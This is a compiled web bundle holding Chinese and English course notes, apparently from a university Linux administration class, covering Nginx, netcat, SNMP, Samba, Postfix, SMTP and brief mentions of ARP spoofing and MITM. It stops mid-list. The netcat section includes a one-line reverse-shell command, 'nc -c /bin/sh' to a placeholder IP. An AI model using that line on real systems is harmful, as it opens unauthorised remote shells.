(window.webpackJsonp=window.webpackJsonp||[]).push([[55],{181:function(e,t,n){"use strict";n.r(t),n.d(t,"frontMatter",(function(){return l})),n.d(t,"metadata",(function(){return i})),n.d(t,"rightToc",(function(){return r})),n.d(t,"default",(function(){return o}));var a=n(1),b=n(9),c=(n(0),n(233)),l={},i={id:"1062/Week-01-Linux-Basic",title:"Week-01-Linux-Basic",description:"tags: `1062` `LSA` `Web Servers` `ncnu` `checkinstall` `ftp` `scp` `nc` `snmp` `fakeroot` `mysql backup` `samba` `postfix` `smtp`",source:"@site/docs/1062/Week-01-Linux-Basic.md",permalink:"/docs/1062/Week-01-Linux-Basic",editUrl:"https://github.com/NCNU-OpenSource/NCNU-OpenSource.github.io/edit/src/docs/1062/Week-01-Linux-Basic.md",sidebar:"someSidebar",previous:{title:"Week-16",permalink:"/docs/1061/Week-16"},next:{title:"Week-01-Web-Servers",permalink:"/docs/1062/Week-01-Web-Servers"}},r=[{value:"Nginx",id:"nginx",children:[{value:"\u81ea\u5b9a\u7fa9 domain \u5c0d\u61c9",id:"\u81ea\u5b9a\u7fa9-domain-\u5c0d\u61c9",children:[]}]},{value:"checkinstall",id:"checkinstall",children:[]},{value:"nc",id:"nc",children:[]},{value:"SNMP \u7c21\u6613\u7db2\u8def\u7ba1\u7406\u5354\u5b9a",id:"snmp-\u7c21\u6613\u7db2\u8def\u7ba1\u7406\u5354\u5b9a",children:[{value:"\u4f60\u5f97\u5148\u77e5\u9053",id:"\u4f60\u5f97\u5148\u77e5\u9053",children:[]},{value:"snmpwalk",id:"snmpwalk",children:[]},{value:"snmptrap",id:"snmptrap",children:[]},{value:"snmpget",id:"snmpget",children:[]},{value:"MRTG",id:"mrtg",children:[]}]},{value:"fakeroot",id:"fakeroot",children:[]},{value:"mysql autobackup",id:"mysql-autobackup",children:[]},{value:"\u50b3\u6a94\u6848",id:"\u50b3\u6a94\u6848",children:[{value:"scp",id:"scp",children:[]},{value:"sftp",id:"sftp",children:[]},{value:"ncftp",id:"ncftp",children:[]}]},{value:"samba",id:"samba",children:[{value:"\u65b0\u589e\u672c\u6a5f\u4f7f\u7528\u8005",id:"\u65b0\u589e\u672c\u6a5f\u4f7f\u7528\u8005",children:[]},{value:"\u66f4\u6539samba's config",id:"\u66f4\u6539sambas-config",children:[]}]},{value:"postfix",id:"postfix",children:[]},{value:"mailbox v.s. maildir",id:"mailbox-vs-maildir",children:[{value:"Mailbox",id:"mailbox",children:[]},{value:"Maildir",id:"maildir",children:[]}]},{value:"\u7db2\u8def\u653b\u64ca",id:"\u7db2\u8def\u653b\u64ca",children:[{value:"\u5e38\u898b\u653b\u64ca",id:"\u5e38\u898b\u653b\u64ca",children:[]},{value:"\u9632\u7bc4\u653b\u64ca OSSEC -- HIDS",id:"\u9632\u7bc4\u653b\u64ca-ossec----hids",children:[]},{value:"\u5bb6\u7528 AP",id:"\u5bb6\u7528-ap",children:[]}]},{value:"STUDY",id:"study",children:[{value:"after install RSSH",id:"after-install-rssh",children:[]},{value:"2\u4eba1\u7d44\u5831\u544a\u984c\u76ee\u8a8d\u9818",id:"2\u4eba1\u7d44\u5831\u544a\u984c\u76ee\u8a8d\u9818",children:[]}]}],p={rightToc:r};function o(e){var t=e.components,n=Object(b.a)(e,["components"]);return Object(c.b)("wrapper",Object(a.a)({},p,n,{components:t,mdxType:"MDXLayout"}),Object(c.b)("p",null,"tags: ",Object(c.b)("inlineCode",{parentName:"p"},"1062")," ",Object(c.b)("inlineCode",{parentName:"p"},"LSA")," ",Object(c.b)("inlineCode",{parentName:"p"},"Web Servers")," ",Object(c.b)("inlineCode",{parentName:"p"},"ncnu")," ",Object(c.b)("inlineCode",{parentName:"p"},"checkinstall")," ",Object(c.b)("inlineCode",{parentName:"p"},"ftp")," ",Object(c.b)("inlineCode",{parentName:"p"},"scp")," ",Object(c.b)("inlineCode",{parentName:"p"},"nc")," ",Object(c.b)("inlineCode",{parentName:"p"},"snmp")," ",Object(c.b)("inlineCode",{parentName:"p"},"fakeroot")," ",Object(c.b)("inlineCode",{parentName:"p"},"mysql backup")," ",Object(c.b)("inlineCode",{parentName:"p"},"samba")," ",Object(c.b)("inlineCode",{parentName:"p"},"postfix")," ",Object(c.b)("inlineCode",{parentName:"p"},"smtp")),Object(c.b)("h1",{id:"1062-lsa-week-02---review-"},"1062 LSA Week 02 - Review :"),Object(c.b)("h2",{id:"nginx"},"Nginx"),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"Load Balancing with Nginx"),"\nwhat is load balancing\n",Object(c.b)("img",Object(a.a)({parentName:"p"},{src:"http://artica-proxy.com/wp-content/uploads/2015/12/load-balancing-proxy.png",alt:"load balancing"}))),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"/etc/nginx/sites-available/{\u6a94\u540d}")),Object(c.b)("blockquote",null,Object(c.b)("pre",{parentName:"blockquote"},Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"upstream pool {\nserver 127.0.0.1:8080; // server 1\nserver 10.21.20.123:80; // server 2\n}\n\nserver {\n\n server_name bluet.org;\n \n location / {\n   proxy_pass http://pool;\n }\n \n}\n")),Object(c.b)("p",{parentName:"blockquote"},Object(c.b)("inlineCode",{parentName:"p"},"$ sudo ln -s /etc/nginx/sites-available/{name} /etc/nginx/sites-enabled/"),"\n\u5982\u6b64\u4f7f\u7528\u700f\u89bd\u5668\u9020\u8a2a ",Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"http://bluet.org/"}),"http://bluet.org/")," \u5c31\u6703\u96a8\u6a5f\u8dd1\u5230 8080 port \u6216 80 port \u7684 server")),Object(c.b)("h3",{id:"\u81ea\u5b9a\u7fa9-domain-\u5c0d\u61c9"},"\u81ea\u5b9a\u7fa9 domain \u5c0d\u61c9"),Object(c.b)("p",null,"\u4f7f\u5f97\u81ea\u5df1\u4e3b\u6a5f\u4e0a\u80fd\u89e3\u6790\u81ea\u5b9a\u7fa9 domain\n\u7de8\u8f2f /etc/hosts (\u6b64\u7232 DNS \u8a2d\u5b9a)"),Object(c.b)("h2",{id:"checkinstall"},"checkinstall"),Object(c.b)("p",null,"\u8a31\u591aOpenSource\u7684\u8edf\u9ad4\u6c92\u6709\u63d0\u4f9b\u91dd\u5c0d\u67d0\u4e9bdistro\u7684binary package\uff0c\u5f88\u591a\u6642\u5019\u8981\u81ea\u5df1\u7de8\u8b6f+\u5b89\u88dd\uff0c\u4f46make install\u7684\u6642\u5019\u8f03\u96e3\u8ffd\u8e64\u6a94\u6848\u7684\u5b89\u88dd\u4f4d\u7f6e\uff0c\u8f03\u597d\u7684\u65b9\u6cd5\u662f\u8b93package manager(dpkg)\u4f86\u7ba1\u7406\u4ed6\u5011\u3002"),Object(c.b)("p",null,"Checkinstall\u53ef\u4ee5\u88fd\u4f5c\u5b89\u88dd\u5305\uff0c\u907f\u514d\u5b89\u88dd\u5f8c\u60f3\u79fb\u9664\u4e0d\u77e5\u9053\u8981\u53bb\u54ea\u4e9b\u5730\u65b9\u522a\u9664"),Object(c.b)("pre",null,Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"$ ./configure && make && make install # \u50b3\u7d71\u65b9\u5f0f\u76f4\u63a5\u5b89\u88dd\n\uff04 ./configure && make && checkinstall # \u65b0\u65b9\u6cd5\u5148\u88fd\u4f5c\u5b89\u88dd\u5305\n\n")),Object(c.b)("h2",{id:"nc"},"nc"),Object(c.b)("p",null,"\u53ef\u53c3\u8003",Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://blog.gtwang.org/linux/linux-utility-netcat-examples/"}),"\u5e38\u898b\u7528\u6cd5")),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},"\u6e2c\u8a66 TCP port \u6709\u6c92\u6709\u958b\n",Object(c.b)("inlineCode",{parentName:"p"},"$ nc -v 192.168.0.175 9527"))),Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},"\u6253\u51fa UDP \u5c01\u5305\n",Object(c.b)("inlineCode",{parentName:"p"},'$ echo -n "I \u2764 LSA!!" | nc -u -w1 192.168.1.8 9527'))),Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},"\u807d UDP \u5c01\u5305\n",Object(c.b)("inlineCode",{parentName:"p"},"$ nc -lu localhost 9527"))),Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},"\u63a5 stdin stdout\n",Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://null-byte.wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over-any-open-port-using-netcat-bash-0132658/"}),"nc hook"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"nc -c /bin/sh <your IP> <any unfiltered port>\n")))),Object(c.b)("h6",{id:"\u7528nc\u4f86\u63a5stdin"},"\u7528nc\u4f86\u63a5stdin"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"server1 : ",Object(c.b)("inlineCode",{parentName:"li"},"nc -l 1234 (port\u865f)")),Object(c.b)("li",{parentName:"ul"},"server2 : ",Object(c.b)("inlineCode",{parentName:"li"},"nc server1_ip 1234"),"[name=yiyu]")),Object(c.b)("h2",{id:"snmp-\u7c21\u6613\u7db2\u8def\u7ba1\u7406\u5354\u5b9a"},"SNMP \u7c21\u6613\u7db2\u8def\u7ba1\u7406\u5354\u5b9a"),Object(c.b)("h3",{id:"\u4f60\u5f97\u5148\u77e5\u9053"},"\u4f60\u5f97\u5148\u77e5\u9053"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"MIB: \u63cf\u8ff0\u88ab\u7ba1\u7406\u8a2d\u5099\u4e0a\u7684\u53c3\u6578\u7684\u6a39\u72c0\u6578\u64da\u7d50\u69cb\uff0c\u6709\u6a19\u6e96\u9810\u8a2d\u4ee3\u865f\uff0c\u5404\u9593\u5ee0\u5546\u4e5f\u53ef\u4ee5\u5b9a\u7fa9\u79c1\u4eba\u6578\u503c\uff0c\u9700\u8981\u5411\u76f8\u95dc\u55ae\u4f4d\u7533\u8acb"),Object(c.b)("li",{parentName:"ul"},"community: \u901a\u95dc\u5bc6\u78bc")),Object(c.b)("h3",{id:"snmpwalk"},"snmpwalk"),Object(c.b)("p",null,"\u4e3b\u52d5\u53bb\u554f\u8a2d\u5099"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ snmpwalk -v2c -c public -O e 127.0.0.1")),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"-v \u7232\u4f7f\u7528\u7248\u672c\uff0c\u4e0a\u8ff0\u4f8b\u5b50\u662f\u4f7f\u7528 2c \u7248\u672c"),Object(c.b)("li",{parentName:"ul"},"-c \u662f\u6307 community\uff0c\u4e5f\u5c31\u662f\u4f60\u5f97\u544a\u8a34\u8a2d\u5099\u901a\u95dc\u5bc6\u78bc\uff0c\u5b83\u624d\u6703\u7d66\u4f60\u8cc7\u8a0a")),Object(c.b)("h3",{id:"snmptrap"},"snmptrap"),Object(c.b)("p",null,"\u53eb\u8a2d\u5099\u4e3b\u52d5\u544a\u8a34\u4f60\uff0c\u901a\u5e38\u662f\u7dca\u6025\u72c0\u6cc1"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ snmptrap -m ./sample- trap.mib\xa0 -v 2c -c public 16.157.76.227:1622")),Object(c.b)("h3",{id:"snmpget"},"snmpget"),Object(c.b)("p",null,"\u53d6\u5f97\u81ea\u5df1ip\u4f4d\u5740\u4e0a\u7684\u67d0\u4e00\u7279\u5b9aOID\u7684VALUE\u548cNAME"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ snmpget v1 -c public <device IP> OID")),Object(c.b)("h3",{id:"mrtg"},"MRTG"),Object(c.b)("p",null,Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"http://163.22.17.70/mrtg/"}),"link")),Object(c.b)("h2",{id:"fakeroot"},"fakeroot"),Object(c.b)("p",null,"\u6a21\u64ec root \u6b0a\u9650\uff0c\u901a\u5e38\u7528\u4f86\u88fd\u4f5c\u5b89\u88dd\u5305\uff0c\u5c07\u88cf\u9762\u6587\u4ef6\u64c1\u6709\u8005\u8a2d\u5b9a\u7232 root"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"\u4ee5\u6253\u5305\u505a\u7bc4\u4f8b")),Object(c.b)("pre",null,Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"$ fakeroot checkinstall --fstrans --install=no\n")),Object(c.b)("h2",{id:"mysql-autobackup"},"mysql autobackup"),Object(c.b)("p",null,Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://www.google.com.tw/search?ei=msT5Wdz_O8Gb0gSqzK74DQ&q=automysqlbackup+ppa&oq=automysqlbackup+ppa&gs_l=psy-ab.3..0i30k1j0i8i30k1.9162.9480.0.9571.4.4.0.0.0.0.86.86.1.1.0....0...1.1.64.psy-ab..3.1.86....0.X6IKtR0JxPQ"}),"\u8c37\u6b4c\u50b3\u9001\u9580")),Object(c.b)("pre",null,Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"$ sudo apt-get install automysqlbackup\n$ sudo vim /etc/automysqlbackup/automysqlbackup.conf/\n$ ls /var/lib/automysqlbackup\n")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"\u8a18\u5f97\u628a automysqlbackup \u52a0\u5230 crontab")),Object(c.b)("h2",{id:"\u50b3\u6a94\u6848"},"\u50b3\u6a94\u6848"),Object(c.b)("h3",{id:"scp"},"scp"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"Usage:\n",Object(c.b)("inlineCode",{parentName:"li"},"$ scp -p {port} {\u6a94\u6848\u540d\u7a31} {username}@{ip}:{\u8def\u5f91}")),Object(c.b)("li",{parentName:"ul"},"Example\n",Object(c.b)("inlineCode",{parentName:"li"},"$ scp yoyodiy.txt username@8.8.8.8:~/ptt.cc/"))),Object(c.b)("h3",{id:"sftp"},"sftp"),Object(c.b)("p",null,"\u53ea\u8981\u6709\u88dd ssh \u5c31\u53ef\u4ee5\u4f7f\u7528 sftp"),Object(c.b)("pre",null,Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"$ sftp {username}@{ip}\n$ lls  #\u5217\u51fa\u672c\u6a5f\u7576\u524d\u8cc7\u6599\u593e\u6587\u4ef6\n>> yoyodiy.txt  xxxxgay.txt\n$ put yoyodiy.txt  game.txt # \u4e0a\u50b3\u6587\u4ef6\u4e26\u4e14\u547d\u540d\u7232 game.txt\n$ ls   #\u5217\u51fa\u9060\u7aef\u7576\u524d\u8cc7\u6599\u593e\u6587\u4ef6\n>> BlueT.heyhey\n$ get BlueT.heyhey          # \u4e0b\u8f09BlueT.heyhey \n")),Object(c.b)("h3",{id:"ncftp"},"ncftp"),Object(c.b)("pre",null,Object(c.b)("code",Object(a.a)({parentName:"pre"},{}),"$ ncftp ftp.ncnu.edu.tw  # \u4e0d\u6307\u5b9a\u4f7f\u7528\u8005\uff0c\u9810\u8a2d\u4f7f\u7528 anonymous\n$ ncftp -u {username} -p {password}`  # \u6307\u5b9a\u4f7f\u7528\u8005\u767b\u5165\n")),Object(c.b)("h2",{id:"samba"},"samba"),Object(c.b)("h3",{id:"\u65b0\u589e\u672c\u6a5f\u4f7f\u7528\u8005"},"\u65b0\u589e\u672c\u6a5f\u4f7f\u7528\u8005"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ sudo adduser {username}")," adduser with home directory\n",Object(c.b)("inlineCode",{parentName:"p"},"$ sudo useradd {username}")," adduser without home directory"),Object(c.b)("h3",{id:"\u66f4\u6539sambas-config"},"\u66f4\u6539samba's config"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ sudo vim /etc/samba/smb.conf")),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},"smb.conf\u6a94\u5167\u5c0d\u5e95\u7aef\u589e\u8a2d"),Object(c.b)("blockquote",{parentName:"blockquote"},Object(c.b)("p",{parentName:"blockquote"},"[{\u5206\u4eab\u6a94\u6848\u540d\u7a31}]","\ncomment =\npath = {PATH TO SHARE}\npublic = yes\nwritable = yes\n;read only = no\ndirectory mode = 0755\ncreate mode = 0755"),Object(c.b)("p",{parentName:"blockquote"},"[homes]","\ncomment = Home Directories\nbrowseable = no\nwritable = yes\ncreate mode = 0644\ndirectory mode = 0755"))),Object(c.b)("blockquote",null,Object(c.b)("blockquote",{parentName:"blockquote"},Object(c.b)("p",{parentName:"blockquote"},"[SharedDir]","\ncomment = Shared Directory\npath = /Test\npublic = yes\nwritable = yes\n;read only = no\ndirectory mode = 0755\ncreate mode = 0755\nvalid users = @group  "))),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},Object(c.b)("strong",{parentName:"p"},"0755 = rwxr-xr-x","[color=blue]","\n\u81f3\u65bcrwx\u662f\u4ec0\u9ebc\uff0c\u8acb\u53c3\u8003LINUX\u9ce5\u54e5")),Object(c.b)("h3",Object(a.a)({parentName:"blockquote"},{id:"\u9023\u63a5\u6e2c\u8a66"}),"\u9023\u63a5\u6e2c\u8a66"),Object(c.b)("p",{parentName:"blockquote"},"linux/mac: "),Object(c.b)("ul",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ul"},Object(c.b)("inlineCode",{parentName:"li"},"smb:\\\\{ip}"),"\nwindows: ")),Object(c.b)("ol",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ol"},Object(c.b)("inlineCode",{parentName:"li"},"\\\\{ip}")),Object(c.b)("li",{parentName:"ol"},"Windows Key + R, type ",Object(c.b)("inlineCode",{parentName:"li"},"\\\\{ip}"))),Object(c.b)("h3",Object(a.a)({parentName:"blockquote"},{id:"\u8a2d\u5b9a\u7fa4\u7d44"}),"\u8a2d\u5b9a\u7fa4\u7d44"),Object(c.b)("p",{parentName:"blockquote"},"\u4fee\u6539 /etc/group\n",Object(c.b)("inlineCode",{parentName:"p"},"samba:x:1001:BlueT,Alice,Bob"),"\n\u4ee3\u8868 BlueT,Alice,Bob \u90fd\u5728 samba \u7fa4\u7d44\u5167")),Object(c.b)("h2",{id:"postfix"},"postfix"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$ apt-get install postfix"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$ sudo dpkg-reconfigure postfix"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"tab")," > ",Object(c.b)("inlineCode",{parentName:"p"},"ok")," > ",Object(c.b)("inlineCode",{parentName:"p"},"{name}")," > ",Object(c.b)("inlineCode",{parentName:"p"},"{username}"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$ sudo netstat -ntupl|grep 25|less"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$ ps aux|grep 24496"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$ iptables -nL")),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},"[color=red]"),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"bt\u8b1b\u89e3"}),"BT\u8b1b\u89e3"),Object(c.b)("p",{parentName:"blockquote"},Object(c.b)("inlineCode",{parentName:"p"},"$ sudo dpkg -i chrome-fdrtyttfy.deb"),"\n-i = install\n",Object(c.b)("inlineCode",{parentName:"p"},"$ sudo apt install -f"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$ sudo dpkg-reconfisgure postfix")," \u628a\u9019\u500b\u5957\u4ef6\u91cd\u65b0\u8a2d\u5b9a\u4e00\u6b21\u3002"),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"aptitude"}),"aptitude"),Object(c.b)("p",{parentName:"blockquote"},Object(c.b)("inlineCode",{parentName:"p"},"/")," > ",Object(c.b)("inlineCode",{parentName:"p"},"bad-mailx"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"/")," > ",Object(c.b)("inlineCode",{parentName:"p"},"postfix"),"\n\u53ef\u900f\u904e\u76f8\u4f9d\u95dc\u4fc2\u67e5\u8a62"),Object(c.b)("h3",Object(a.a)({parentName:"blockquote"},{id:"postfix-1"}),"postfix"),Object(c.b)("p",{parentName:"blockquote"},"MTA contains 2 function\n: 1. send\n: 2. receive"),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"configuration"}),"Configuration"),Object(c.b)("ul",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ul"},"Internet Site \u7531\u672c\u6a5f\u5bc4\u4fe1"),Object(c.b)("li",{parentName:"ul"},"Internet with smarthost \u4ea4\u7531\u5176\u4ed6\u90f5\u4ef6\u4f3a\u670d\u5668\u5bc4\u4fe1"),Object(c.b)("li",{parentName:"ul"},"Local only \u53ea\u80fd\u4e3b\u6a5f\u5167\u4f7f\u7528\u8005\u76f8\u4e92\u5bc4\u4fe1")),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"mail-for-the-postmaster"}),"Mail for the 'postmaster'"),Object(c.b)("ul",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ul"},"\u5982\u679c\u6709\u4eba\u5bc4\u7d66\u7ba1\u7406\u54e1\uff0c\u8981\u8f49\u9001\u7d66\u8ab0")),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"network-blocks-for-which-this-host-should-relay-mail"}),"network blocks for which this host should relay mail"),Object(c.b)("ul",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ul"},"\u54ea\u4e9b\u7db2\u6bb5\u7684\u4eba\u53ef\u4ee5\u5bc4\u4fe1")),Object(c.b)("h4",Object(a.a)({parentName:"blockquote"},{id:"local-address-extension-character"}),"Local address extension character"),Object(c.b)("ul",{parentName:"blockquote"},Object(c.b)("li",{parentName:"ul"},"\u9810\u8a2d\u70ba + \u865f"),Object(c.b)("li",{parentName:"ul"},"e.g., aaa+domain@gmail.com"),Object(c.b)("li",{parentName:"ul"},"\u9019\u662f\u8aaa\u5bc4\u7d66 aaa@gmail.com"),Object(c.b)("li",{parentName:"ul"},"\u4f46\u662f\u6536\u4ef6\u8005\u53ef\u4ee5\u81ea\u884c\u5c07\u8a72\u4fe1\u5206\u985e\u5230 domain\n0.0.0.0\u662f\u6307\u6240\u6709\u5340\u6bb5")),Object(c.b)("p",{parentName:"blockquote"},":::danger\n\u5b89\u88dd\u5f8c\u8acb\u78ba\u4fdd\u662f\u5426\u53ef\u57f7\u884c\u4ee5\u4e0b\u6307\u4ee4\uff1a\n1. iptables\n2. route\n:::"),Object(c.b)("h2",Object(a.a)({parentName:"blockquote"},{id:"smtp-demo-by-yychang"}),"smtp DEMO by yy.chang"),Object(c.b)("p",{parentName:"blockquote"},"smtp \u5bc4\u4fe1protocol : 25\n",Object(c.b)("inlineCode",{parentName:"p"},"$ telnet smtp.ncnu.edu.tw 25")),Object(c.b)("blockquote",{parentName:"blockquote"},Object(c.b)("p",{parentName:"blockquote"},"HELO\nMAIL FROM:a@ncnu.edu.tw\nRCPT TO:{\u8981\u5bc4\u7d66\u8ab0@mail.com}\nDATA\nFrom : {sender@mail.com}\nTo : {who@mail.com}\nSubject: {\u4e3b\u65e8}\n{\u4fe1\u4ef6\u5167\u5bb9}\n{type \u4ec0\u9ebc\u5b57\u5143}\n.\n{type enter}"))),Object(c.b)("h2",{id:"mailbox-vs-maildir"},Object(c.b)("a",Object(a.a)({parentName:"h2"},{href:"http://www.coctec.com/docs/service/show-post-30617.html"}),"mailbox v.s. maildir")),Object(c.b)("h3",{id:"mailbox"},"Mailbox"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"\u6240\u6709\u4fe1\u4ef6\u5b58\u653e\u5728\u540c\u4e00\u500b\u6a94\u6848"),Object(c.b)("li",{parentName:"ul"},"Fast")),Object(c.b)("h3",{id:"maildir"},"Maildir"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"\u6bcf\u5c01\u4fe1\u4ef6\u500b\u5225\u7232\u4e00\u500b\u6a94\u6848")),Object(c.b)("h4",{id:"format"},"format"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},"current \u7de8\u5beb\u4e2d\u7684\u4fe1"),Object(c.b)("li",{parentName:"ul"},"new "),Object(c.b)("li",{parentName:"ul"},"tmp \u6e96\u5099\u5bc4\u51fa\u7684\u4fe1")),Object(c.b)("h2",{id:"\u7db2\u8def\u653b\u64ca"},"\u7db2\u8def\u653b\u64ca"),Object(c.b)("h3",{id:"\u5e38\u898b\u653b\u64ca"},"\u5e38\u898b\u653b\u64ca"),Object(c.b)("p",null,"ARP: \u5728\u6211\u60f3\u8981\u9023\u7dda\u5230\u5167\u7db2\u4e2d\u67d0\u500bip(10.0.0.1)\u6642\uff0c\u4f46\u6211\u4e0d\u77e5\u9053\u5b83\u7684mac address\uff0c\u6240\u4ee5\u6211\u8981\u5148\u767c\u4e00\u500b\u5ee3\u64ad\u5c01\u5305(arp request)\u554f\u5927\u5bb6\u201d\u5b89\u5b89\uff0c\u8ab0\u662f10.0.0.1\u5462\u201c\uff0c\u65bc\u662f10.0.0.1\u7684device\u5c31\u6703\u56de\u50b3arp reply(unicast)\uff0c\u6211\u5c31\u77e5\u9053\u4ed6\u7684mac address\u4e86\n",Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"http://www.pcnet.idv.tw/pcnet/network/network_ip_arp.htm"}),"\u5716\u7247\u652f\u63f4")),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://zh.wikipedia.org/wiki/ARP%E6%AC%BA%E9%A8%99"}),"ARP\u6b3a\u9a19"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$arp -a"))),Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://steachs.com/archives/902"}),"\u7db2\u8def\u526a\u5200\u624b")," \u5bbf\u820d switch \u6709\u7d81\u5b9a uplink, \u56e0\u6b64\u5728\u5b78\u6821\u5bbf\u820d\u4e0d\u7ba1\u7528")),Object(c.b)("li",{parentName:"ul"},Object(c.b)("p",{parentName:"li"},Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://blog.trendmicro.com.tw/?p=52362"}),"MITM")," - man in the middle attack "))),Object(c.b)("h3",{id:"\u9632\u7bc4\u653b\u64ca-ossec----hids"},"\u9632\u7bc4\u653b\u64ca OSSEC -- HIDS"),Object(c.b)("p",null,Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"https://github.com/ossec/ossec-hids"}),"OSSEC-HIDS")),Object(c.b)("h3",{id:"\u5bb6\u7528-ap"},"\u5bb6\u7528 AP"),Object(c.b)("ul",null,Object(c.b)("li",{parentName:"ul"},Object(c.b)("a",Object(a.a)({parentName:"li"},{href:"https://blog.gtwang.org/linux/linux-utility-netcat-examples/"}),"DMZ \u975e\u8ecd\u4e8b\u5340")),Object(c.b)("li",{parentName:"ul"},Object(c.b)("a",Object(a.a)({parentName:"li"},{href:"http://www.sapido.com.tw/CH/learning/virtual_server.htm"}),"\u865b\u64ec\u4f3a\u670d\u5668"))),Object(c.b)("p",null,Object(c.b)("a",Object(a.a)({parentName:"p"},{href:"http://www.duckll.tw/2018/02/itaiwan.html?m=1"}),"iTaiwan\u91e3\u9b5a")),Object(c.b)("p",null,"what is nologin, false in ",Object(c.b)("inlineCode",{parentName:"p"},"sudo vipw ->3"),"\n\u88cf\u9762\u7684\u6771\u6771\u9700\u8981\u5728 /etc/shells \u6709\u624d\u6703\u751f\u6548"),Object(c.b)("h2",{id:"study"},"STUDY"),Object(c.b)("p",null,"other shell\nrssh, dropbear, restrict shell\nchroot \u505a\u9650\u5236"),Object(c.b)("h3",{id:"after-install-rssh"},"after install RSSH"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"$sudo vim /etc/shells"),"\n",Object(c.b)("inlineCode",{parentName:"p"},"$sudo vim /etc/passwd")),Object(c.b)("h3",{id:"2\u4eba1\u7d44\u5831\u544a\u984c\u76ee\u8a8d\u9818"},"2\u4eba1\u7d44\u5831\u544a\u984c\u76ee\u8a8d\u9818"),Object(c.b)("ol",null,Object(c.b)("li",{parentName:"ol"},"What is ",Object(c.b)("inlineCode",{parentName:"li"},"nologin"),", ",Object(c.b)("inlineCode",{parentName:"li"},"false")," ($Don^2 Tsai$)\n",Object(c.b)("inlineCode",{parentName:"li"},"\uff04cat /etc/passwd"),"\u6703\u767c\u73fe\u5230\u4e00\u4e9b\u7528\u6236\u88ab\u8a2d\u5b9a\u6210\n",Object(c.b)("inlineCode",{parentName:"li"},"/usr/sbin/nologin")," ",Object(c.b)("inlineCode",{parentName:"li"},"/bin/false"),"\n\u5982\u8981\u62d2\u7d55\u7cfb\u7d71\u7528\u6236\u767b\u9304\uff0c\u53ef\u4ee5\u5c07\u8a72shell\u8a2d\u5b9a\u6210\n",Object(c.b)("inlineCode",{parentName:"li"},"\uff04usermod -s | --shell /usr/sbin/nologin username\n"),"\u4e0d\u5141\u8a31\u7cfb\u7d71login\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6ftp\u7b49\u670d\u52d9\n",Object(c.b)("inlineCode",{parentName:"li"},"$usermod -s | --shell /bin/false username\n"),"\u7981\u6b62\u4e00\u5207\u670d\u52d9"),Object(c.b)("li",{parentName:"ol"},"Other shell (yiyu)"),Object(c.b)("li",{parentName:"ol"},"rssh 